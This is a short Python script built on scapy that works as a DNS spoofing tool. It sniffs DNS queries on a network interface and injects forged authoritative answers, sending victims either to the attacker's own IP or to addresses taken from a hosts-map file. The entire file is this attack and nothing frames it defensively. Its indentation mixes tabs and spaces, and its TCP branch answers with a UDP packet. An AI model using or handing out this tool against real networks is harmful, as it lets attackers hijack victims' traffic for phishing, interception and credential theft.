#!/usr/bin/python
from optparse import OptionParser
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import netifaces as ni
import os
import socket
import pcap
from scapy.all import *

def get_ip(ifname):
    ni.ifaddresses(ifname)
    ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
    return ip

def injector(pkt):
	redirect_to=""
	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
		affectedHost = pkt[DNSQR].qname
		if options.hostsmap!=None:
			if affectedHost.rstrip('.') in mapping:
            			redirect_to = mapping[affectedHost.rstrip('.')]
			if(redirect_to==""):
				return

		else:
			redirect_to = get_ip(options.interface)
		if pkt.haslayer(UDP):
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
		elif pkt.haslayer(TCP):
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
				      UDP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)/\
				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
		else:
			return
		send(spoofed_pkt)

if __name__ == '__main__':
	mapping = {}
	parser = OptionParser()
	parser.set_conflict_handler("resolve")
	parser.add_option('-i', dest="interface",default=pcap.lookupdev())
	parser.add_option('-h', dest="hostsmap")

	(options, remainder) = parser.parse_args()
	expression = remainder
	if len(expression)>0:
		exp = expression[0]
	else:
		exp = ""

	if options.hostsmap==None:
		redirect_to = get_ip(options.interface)
	else:
        redirect_to=""
        file=open(options.hostsmap,"r")
        for line in file:
            row = line.split()
            mapping[row[1]]=row[0]

	sniff(filter=exp, prn=injector, store=0, iface=options.interface)
